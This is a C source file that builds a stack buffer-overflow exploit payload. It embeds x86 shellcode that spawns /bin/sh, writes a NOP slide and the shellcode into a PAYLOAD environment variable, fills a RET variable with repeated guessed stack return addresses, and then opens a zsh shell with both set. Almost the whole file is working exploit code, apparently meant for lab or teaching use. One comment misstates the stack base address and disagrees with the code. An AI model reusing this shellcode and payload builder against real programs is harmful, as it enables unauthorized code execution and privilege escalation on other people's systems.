#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

//Constants for payload construction
#define SHELLCODE_SIZE 45         // Size of the embedded shellcode
#define NOP 0x90                  // NOP instruction (used for NOP slide)
#define DEFAULT_OFFSET 0          // Default offset to subtract from target address
#define ADDRESS_BLOCK_SIZE 64     // Number of return addresses to repeat
#define ADJUSTMENT 0              // Extra NOPs before the address block
#define NOP_SLIDE_SIZE 2000       // Length of NOP slide

//Shellcode to spawn a /bin/sh shell
char shellcode[] = 
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[]) {
    char *ret_buffer, *ptr, *payload;
    unsigned long **addr_ptr, *target_addr;
    unsigned long nop_size, shellcode_size, addr_block_size, adj, offset;
    int i;

    //Set default values for payload parameters
    offset = (unsigned long)DEFAULT_OFFSET;
    nop_size = (unsigned long)NOP_SLIDE_SIZE;
    addr_block_size = (unsigned long)ADDRESS_BLOCK_SIZE;
    adj = (unsigned long)ADJUSTMENT;

    if (argc < 3 || argc > 5) {
        fprintf(stderr, "Usage: %s <NOP slide length> <address block length> [offset [address adjustment]]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    /**
    Base stack address to start from (may vary depending on environment),
    but most x86 systems have base stack addr at 0xc000000
    **/
    target_addr = (unsigned long *)0xc0000000;

    // Parse command-line arguments
    nop_size = strtol(argv[1], NULL, 0);
    addr_block_size = strtol(argv[2], NULL, 0);
    if (argc > 3)
        offset = strtol(argv[3], NULL, 0);
    if (argc > 4)
        adj = strtol(argv[4], NULL, 0);
    
    shellcode_size = (unsigned long)SHELLCODE_SIZE;

    //Payload info
    printf("RET Structure\n");
    printf("    # of Addresses in Address Block:    %lu\n", addr_block_size);
    printf("    Adjustment:                         %lu\n", adj);
    printf("    Address Data\n");
    printf("        Offset:                         %lu\n", offset);
    printf("        Stack Address:                 %p\n", (void*)target_addr);
    
    //Apply offset to get the effective target address
    target_addr = (unsigned long *)((unsigned long)target_addr - offset);

    printf("    Target Address:                    %p\n", (void*)target_addr);
    printf("    Total RET size (adds + adj + 5):   %lu\n", 4 * addr_block_size + adj + 5);
    printf("Payload Buffer Structure\n");
    printf("    NOP slide Size:                     %lu\n", nop_size);
    printf("    Shellcode Size:                     %lu\n", shellcode_size);

    // Allocate buffer for RET= environment variable
    // Format: "RET=" + [ADJ NOPs] + [ADDR repeated]
    if (!(ret_buffer = malloc(4 * addr_block_size + adj + 5))) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    memcpy(ret_buffer, "RET=", 4);
    ptr = ret_buffer + 4;

    //Create NOP slide
    for (i = 0; i < adj; i++)
        *(ptr++) = NOP;

    //Fill address block with repeated target addresses of NOP slide
    addr_ptr = (unsigned long **)ptr;
    for (i = 0; i < addr_block_size; i++)
        *(addr_ptr++) = target_addr;

    //Allocate buffer for PAYLOAD= environment variable
    //Format: "PAYLOAD=" + [NOP slide] + [shellcode]
    if (!(payload = malloc(nop_size + shellcode_size + 1 + 8))) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    memcpy(payload, "PAYLOAD=", 8);
    ptr = payload + 8;

    //Fill with NOP slide
    for (i = 0; i < nop_size; i++)
        *(ptr++) = NOP;

    //Copy in shellcode after NOP slide
    for (i = 0; i < shellcode_size; i++)
        *(ptr++) = shellcode[i];

    //Null terminate both environment variable strings
    ret_buffer[4 * addr_block_size + 4 + adj] = '\0';
    payload[nop_size + shellcode_size + 8] = '\0';

    //Add the variables to the environment
    putenv(payload);
    putenv(ret_buffer);

    //Drop into a shell to keep the process alive for potential exploitation
    system("/bin/zsh");

    return 0;
}
